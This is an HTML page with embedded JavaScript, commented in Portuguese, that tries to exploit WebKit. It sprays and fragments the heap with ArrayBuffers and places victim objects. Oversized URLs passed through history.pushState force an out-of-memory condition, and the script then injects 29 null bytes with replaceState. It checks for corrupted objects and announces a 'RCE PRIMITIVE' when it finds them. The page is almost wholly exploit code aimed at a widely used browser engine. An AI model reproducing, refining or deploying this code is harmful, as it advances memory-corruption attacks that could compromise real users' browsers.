<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>WebKit OOM Trigger (29 Bytes)</title>
    <style>
        body { background-color: #000; color: #0f0; font-family: monospace; padding: 20px; }
        #log { border: 1px solid #333; padding: 10px; height: 500px; overflow-y: scroll; white-space: pre-wrap; font-size: 14px;}
        button { padding: 15px; font-size: 1.2em; background: #111; color: #fff; border: 1px solid #0f0; margin: 10px 0; width: 100%; cursor: pointer; }
        button:hover { background: #222; }
        input { background: #222; color: #fff; border: 1px solid #555; padding: 5px; }
        .win { color: #ff0; font-weight: bold; border: 1px solid #ff0; padding: 5px; background: #440; }
    </style>
</head>
<body>

<h1>REPLICA 100% FIEL + INJEÇÃO NO OOM</h1>
<p>Sequência Obrigatória: 6 -> 3 -> 1 (Esperar mensagem de memória e Cancelar)</p>

<h3>1. TESTE 6 (Incremental)</h3>
<label>Start:</label> <input type="number" id="t6start" value="1000">
<label>Step:</label> <input type="number" id="t6step" value="5000">
<button onclick="test6_Incremental()">Executar Teste 6</button>

<h3>2. TESTE 3 (Padrões)</h3>
<button onclick="test3_SpecialSequences()">Executar Teste 3</button>

<h3>3. TESTE 1 (Loop de Estresse + Injeção)</h3>
<p style="color:red">ATENÇÃO: Quando aparecer a mensagem de memória: CLIQUE EM CANCELAR.</p>
<button onclick="test1_StressAndInject()" style="border-color:red; color:red">Executar Teste 1</button>

<div id="log"></div>

<script>
// CONSTANTES ORIGINAIS
const BASE_SAFE = 709522;

// Globais para verificação
let heapObjects = [];
let targetObjects = [];

function log(msg, type='') {
    const el = document.getElementById('log');
    const color = type === 'win' ? 'yellow' : '#0f0';
    el.innerHTML += `<div style="color:${color}">[${new Date().toLocaleTimeString()}] ${msg}</div>`;
    el.scrollTop = el.scrollHeight;
}

function prepareHeap() {
    log('Preparando heap...');
    heapObjects = [];
    targetObjects = [];
    
    // Spray genérico
    for (let i = 0; i < 500; i++) {
        const buf = new ArrayBuffer(1024);
        const view = new Uint32Array(buf);
        view.fill(0x41414141);
        heapObjects.push({buf, view});
    }
    // Buracos
    for (let i = 0; i < heapObjects.length; i += 3) {
        heapObjects[i] = null;
    }
    // Alvos (Vítimas para corrupção)
    for (let i = 0; i < 50; i++) {
        const buf = new ArrayBuffer(1024);
        const view = new Uint32Array(buf);
        view.fill(0xDEADBEEF);
        targetObjects.push({
            id: i,
            magic: 0xCAFEBABE,
            view: view
        });
    }
    log('Heap preparado.');
}

function checkCorruption() {
    let corrupted = 0;
    for (let i = 0; i < Math.min(10, targetObjects.length); i++) {
        try {
            const t = targetObjects[i];
            // Se magic number mudar ou conteúdo mudar, vencemos
            if (t.view.byteLength === 0 || t.view.length !== 256 || t.view[0] !== 0xDEADBEEF) {
                log(`!!! JACKPOT !!! Alvo ${i} CORROMPIDO! (Len: ${t.view.length}, Val: 0x${t.view[0]?.toString(16)})`, 'win');
                corrupted++;
                alert("RCE PRIMITIVE: Corrupção confirmada!");
            }
        } catch (e) {
            log(`Alvo ${i} inacessível (Ponteiro destruído?): ${e.message}`, 'win');
            corrupted++;
        }
    }
    return corrupted;
}

// ===================================================================
// TESTE 6: CÓPIA EXATA DO ORIGINAL
// ===================================================================
async function test6_Incremental() {
    log('=== TESTE 6: INCREMENTAL ===');
    prepareHeap();
    
    const start = parseInt(document.getElementById('t6start').value);
    const step = parseInt(document.getElementById('t6step').value);
    let currentSize = start;
    
    for (let i = 0; i < 10; i++) {
        log(`Tentativa ${i+1}: ${currentSize} bytes`);
        try {
            const base = "A".repeat(BASE_SAFE);
            let overflow = "";
            for (let j = 0; j < currentSize; j++) {
                overflow += String.fromCharCode(j % 33);
            }
            const payload = "/" + base + overflow;
            history.pushState({}, `inc_${currentSize}`, payload);
            
            log(`SUCESSO com ${currentSize} bytes`);
            currentSize += step;
            await new Promise(r => setTimeout(r, 1500)); // Delay original
        } catch (e) {
            log(`CRASH em ${currentSize} bytes: ${e.message}`);
            break;
        }
    }
    log("Teste 6 Finalizado.");
}

// ===================================================================
// TESTE 3: CÓPIA EXATA DO ORIGINAL
// ===================================================================
async function test3_SpecialSequences() {
    log('=== TESTE 3: SEQUÊNCIAS ===');
    // Nota: O original chamava prepareHeap() aqui também. Mantendo fiel.
    prepareHeap(); 
    
    const sequences = [
        { name: "Null-terminated", bytes: [0x00, 0x00, 0x00, 0x00] },
        { name: "Newlines", bytes: [0x0A, 0x0A, 0x0A, 0x0A] },
        { name: "Tabs", bytes: [0x09, 0x09, 0x09, 0x09] },
        { name: "Carriage Return", bytes: [0x0D, 0x0D, 0x0D, 0x0D] },
        { name: "Space", bytes: [0x20, 0x20, 0x20, 0x20] },
        { name: "Mixed Control", bytes: [0x00, 0x09, 0x0A, 0x0D, 0x20] },
        { name: "ASCII Control", bytes: [0x01, 0x02, 0x03, 0x04, 0x05] },
        { name: "Bell/Backspace", bytes: [0x07, 0x08, 0x08, 0x07] }
    ];

    for (let seq of sequences) {
        try {
            const base = "A".repeat(BASE_SAFE);
            let overflow = "";
            for (let i = 0; i < 1000; i++) {
                for (let byte of seq.bytes) {
                    overflow += String.fromCharCode(byte);
                }
            }
            const payload = "/" + base + overflow;
            history.pushState({}, seq.name.replace(/\s/g, '_'), payload);
            log(`SUCESSO: ${seq.name}`);
            await new Promise(r => setTimeout(r, 100)); // Delay UI original
        } catch (e) {
            log(`CRASH: ${seq.name} - ${e.message}`);
        }
    }
    log("Teste 3 Finalizado.");
}

// ===================================================================
// TESTE 1: LOOP ORIGINAL + INJEÇÃO NO CRASH
// ===================================================================
async function test1_StressAndInject() {
    log('=== TESTE 1: LOOP DE ESTRESSE (GATILHO) ===');
    prepareHeap(); 
    
    // Executa o loop original de 0 a 255
    // É este processo que causa o OOM
    for (let byte = 0x00; byte <= 0xFF; byte++) {
        try {
            const base = "A".repeat(BASE_SAFE);
            const testByte = String.fromCharCode(byte);
            
            // Payload Original: 100 repetições
            const overflow = testByte.repeat(100); 
            const payload = "/" + base + overflow;
            
            history.pushState({}, `test_${byte}`, payload);
            
            if (byte % 16 === 0) {
                 log(`Testando 0x${byte.toString(16)}... OK`);
                 // Pequena pausa necessária para a UI desenhar o alerta de memória
                 await new Promise(r => setTimeout(r, 15)); 
            }
            
        } catch (e) {
            log(`ERRO/OOM DETECTADO em 0x${byte.toString(16)}: ${e.message}`);
            
            // AQUI ESTÁ A LÓGICA DE OURO:
            // O erro aconteceu. O usuário (você) clicou em cancelar.
            // Agora injetamos os 29 bytes de zeros.
            try {
                log("!!! INJETANDO 29 BYTES (ZEROS) NO VÁCUO !!!", 'win');
                
                const base = "A".repeat(BASE_SAFE);
                // Os 29 bytes que você confirmou serem permitidos
                const attack = "\x00".repeat(29); 
                
                // Usamos replaceState para sobrescrever no lugar sem gastar quota extra
                history.replaceState({}, "PWN", "/" + base + attack);
                
                log(">>> INJEÇÃO ACEITA! VERIFICANDO CORRUPÇÃO... <<<", 'win');
                
                // Checagem imediata
                let found = checkCorruption();
                if (found > 0) return; // Para se achou
                
            } catch(ex) {
                log("Falha na injeção: " + ex.message);
            }
        }
    }
    
    log("Teste 1 Finalizado. Verifique se houve corrupção acima.");
    checkCorruption(); // Checagem final
}
</script>
</body>
</html>
